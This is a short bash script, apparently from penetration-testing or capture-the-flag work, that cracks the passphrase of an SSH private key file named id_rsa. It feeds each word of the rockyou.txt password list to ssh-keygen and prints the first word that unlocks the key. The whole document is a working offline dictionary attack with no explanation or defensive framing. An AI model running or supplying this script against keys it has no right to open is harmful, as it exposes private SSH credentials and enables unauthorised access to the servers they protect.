#!/bin/bash
 
for WORD in `cat /usr/share/wordlists/rockyou.txt`
do
	/usr/bin/ssh-keygen -y -f id_rsa -P "$WORD" 2>/dev/null
	if [[ $? = 0 ]]; then
    		echo "[+] Found:" $WORD
		break
	fi
done
